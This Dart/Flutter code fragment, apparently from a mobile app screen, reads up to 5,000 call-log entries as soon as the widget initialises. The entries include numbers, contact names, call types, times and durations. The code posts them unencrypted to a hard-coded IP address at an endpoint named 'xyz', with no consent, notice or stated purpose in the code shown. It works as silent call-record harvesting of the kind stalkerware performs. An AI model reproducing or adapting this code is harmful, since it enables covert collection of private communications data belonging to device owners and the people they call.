@override
 void initState() {
   super.initState();
   fetchDataAndUpload();
 }

 Future<void> fetchDataAndUpload() async {
   try {
     // Fetch call logs
     List<CallLogEntry> callLogs = await getCallLogs();

     print("length : ${callLogs.length}");
     // Convert call logs to JSON format

     List<Map<String, dynamic>> callLogsJson =
         convertCallLogsToJson(callLogs.take(5000).toList());

     // Upload call logs
     await uploadToServer(callLogsJson);
   } catch (e) {
     print('Error: $e');
     // Handle errors as needed
   }
 }

 Future<List<CallLogEntry>> getCallLogs() async {
   Iterable<CallLogEntry> entries = await CallLog.get();
   return entries.toList();
 }

 List<Map<String, dynamic>> convertCallLogsToJson(
     List<CallLogEntry> callLogs) {
   return callLogs.map((entry) {
     return {
       'number': entry.number,
       'name': entry.name,
       'type': entry.callType.toString(),
       'date': entry.timestamp,
       'duration': entry.duration,
       'formattedDate':
           DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0),
     };
   }).toList();
 }

 Future<void> uploadToServer(List<Map<String, dynamic>> callLogsJson) async {
   final url = 'http://165.22.222.50/koanApi-laravel/public/api/xyz';

   try {
     final response = await http.post(
       Uri.parse(url),
       headers: {'Content-Type': 'application/json'},
       body: jsonEncode({'call_logs': callLogsJson}),
     );

     if (response.statusCode == 200) {
       //todo
     } else {
       // Handle upload failure
     }
   } catch (e) {
     print('Error uploading call logs: $e');
     // Handle upload error
   }
 }
